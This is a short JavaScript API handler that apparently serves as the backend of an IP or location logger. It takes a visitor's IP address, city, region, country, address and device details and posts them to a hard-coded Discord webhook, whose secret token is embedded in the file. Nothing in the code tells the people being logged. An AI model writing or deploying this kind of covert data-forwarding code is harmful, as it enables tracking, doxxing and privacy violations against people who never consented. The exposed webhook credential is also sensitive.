const url =
  "https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc";

export default async (req, res) => {
  switch (req.method) {
    case "POST":
      var {
        ip,
        city,
        region,
        country,
        locationMessage,
        addressMessage,
        deviceMessage,
      } = req.body;
      if (
        ip == undefined ||
        city == undefined ||
        region == undefined ||
        country == undefined ||
        locationMessage == undefined ||
        addressMessage == undefined ||
        deviceMessage == undefined
      )
        return res
          .status(400)
          .json({ success: false, code: 400, error: "no message specified" });
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `\`\`\`
IP Address: ${ip}
Location: ${city}, ${region}, ${country}
${locationMessage}
${addressMessage}
${deviceMessage}
\`\`\``,
        }),
      });
      return res.status(200).json({ success: true, code: 405, args: req.body });
    default:
      return res.status(405).json({
        success: false,
        code: 405,
        error: "method not allowed",
        args: req.body,
      });
  }
};
